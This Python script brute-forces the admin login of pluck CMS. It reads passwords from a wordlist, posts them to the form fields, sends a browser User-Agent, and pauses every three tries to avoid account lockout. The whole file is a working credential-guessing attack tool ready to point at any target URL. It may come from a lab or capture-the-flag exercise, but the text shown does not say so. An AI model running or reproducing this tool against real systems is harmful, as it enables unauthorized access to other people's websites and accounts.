#!/usr/bin/env python3
"""
Brute-force login script for pluck CMS.

Author: alienfader

This script attempts to brute-force a login page by reading passwords from a wordlist,
submitting them to the login form, and checking for a successful login based on changes
in the response. The form requires three fields:
  - 'cont1': The password input.
  - 'bogus': A hidden honeypot field (must remain empty).
  - 'submit': The submit button value ('Log in').

Note: The success detection logic is based on the absence of the login form in the returned HTML.
Adjust the success criteria if necessary.
"""

import requests
import time
import argparse

def brute_force_login(url, wordlist_path):
    """
    Attempts to brute force login to the specified URL using passwords from the wordlist.

    Parameters:
        url (str): The login URL.
        wordlist_path (str): The path to the file containing potential passwords.
    """
    # Create a session to persist cookies and other session data between requests.
    session = requests.Session()
    
    # Set a user-agent header to mimic a real browser.
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    })
    
    # Perform an initial GET request to obtain any cookies or session data.
    session.get(url)
    
    # Open the wordlist file and read all the lines (each line is a potential password).
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as file:
        passwords = file.readlines()

    attempt = 0
    # Iterate through each password from the wordlist.
    for password in passwords:
        password = password.strip()  # Remove any extra whitespace or newline characters.
        attempt += 1

        # Build the POST data payload with the form fields required by the login page.
        data = {
            'cont1': password,    # Password field.
            'bogus': '',          # Honeypot field; must remain empty.
            'submit': 'Log in'    # Submit button value to simulate the form submission.
        }

        # Send a POST request with the current password.
        response = session.post(url, data=data)
        
        # Debug output for each attempt.
        print(f"Attempt {attempt} with password: {password}")
        print("Response URL:", response.url)
        print("Response History:", response.history)
        print("Cookies:", session.cookies.get_dict())
        # Uncomment the next line to see a snippet of the HTML response.
        # print(response.text[:500])
        
        # Determine if login was successful.
        # In this case, we assume a successful login if the login form is absent from the response.
        if '<input name="cont1"' not in response.text:
            print(f'[+] Success! Password found: {password}')
            return
        
        print(f'[-] Attempt {attempt}: Failed login with {password}')
        
        # To help avoid lockouts, wait 30 seconds after every 3 attempts.
        if attempt % 3 == 0:
            print('[*] Waiting 30 seconds to avoid lockout...')
            time.sleep(30)

    print('[-] Brute-force attack completed. No valid password found.')

if __name__ == "__main__":
    # Set up command-line argument parsing.
    parser = argparse.ArgumentParser(description='Brute-force login script for pluck CMS')
    parser.add_argument('url', type=str, help='Target login URL')
    parser.add_argument('-wordlist', type=str, required=True, help='Path to the wordlist')
    
    args = parser.parse_args()
    
    # Start the brute-force login process using the provided arguments.
    brute_force_login(args.url, args.wordlist)
